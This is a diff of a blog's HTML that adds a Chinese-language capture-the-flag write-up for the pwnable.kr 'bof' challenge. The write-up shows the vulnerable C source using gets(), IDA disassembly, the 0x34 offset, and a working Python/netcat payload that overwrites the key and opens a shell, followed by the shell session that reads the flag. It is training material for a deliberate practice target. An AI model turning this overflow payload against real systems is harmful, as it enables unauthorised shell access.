@@ -318,6 +318,197 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2017/12/08/pwnable.kr-bof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="努力学习网络安全技术，喜欢二进制，一直努力但进步甚微。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/08/pwnable.kr-bof/" itemprop="url">
+                  pwnable.kr-bof
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2017-12-08 16:43:00" itemprop="dateCreated datePublished" datetime="2017-12-08T16:43:00+08:00">2017-12-08</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/08/pwnable.kr-bof/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2017/12/08/pwnable.kr-bof/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看源码<code>bof.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>func函数中如果传入参数为<code>0xcafebabe</code>则会获得一个shell，但是main函数中调用func函数时传入了一个错误的数值，显然这题是要通过栈溢出来覆盖形参key的值。<br>通过ida查看bof程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000062C                 public func</span><br><span class="line">.text:0000062C func            proc near               ; CODE XREF: main+10p</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C s               = byte ptr -2Ch</span><br><span class="line">.text:0000062C var_C           = dword ptr -0Ch</span><br><span class="line">.text:0000062C arg_0           = dword ptr  8</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C                 push    ebp</span><br><span class="line">.text:0000062D                 mov     ebp, esp</span><br><span class="line">.text:0000062F                 sub     esp, 48h</span><br><span class="line">.text:00000632                 mov     eax, large gs:14h</span><br><span class="line">.text:00000638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:0000063B                 xor     eax, eax</span><br><span class="line">.text:0000063D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:00000644                 call    puts</span><br><span class="line">.text:00000649                 lea     eax, [ebp+s]</span><br><span class="line">.text:0000064C                 mov     [esp], eax      ; s</span><br><span class="line">.text:0000064F                 call    gets</span><br></pre></td></tr></table></figure></p>
+<p>上面是func函数的汇编片段，可以看到func函数开辟了48h的栈空间，但是gets函数将输入字符串存放在ebp偏移-2ch的位置，再加上ebp，retaddr的大小一共是34h的偏移，这个34h就是overflow到key的偏移，于是有下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;a&apos;*0x34+&apos;\xbe\xba\xfe\xca&apos;&quot;;cat) | nc pwnable.kr 9000</span><br></pre></td></tr></table></figure></p>
+<p>其中加cat维持shell的交互<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/pwn/bof# (python -c &quot;print &apos;a&apos;*0x34+&apos;\xbe\xba\xfe\xca&apos;&quot;;cat) | nc pwnable.kr 9000</span><br><span class="line">ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2017/12/08/pwnable.kr-collision/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1183,7 +1374,7 @@ python:                python 2.7
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-count">45</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1317,7 +1508,7 @@ python:                python 2.7
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共51.3k字</span>
+  <span class="post-count">博客全站共51.9k字</span>
 </div>
         
 <div class="busuanzi-count">
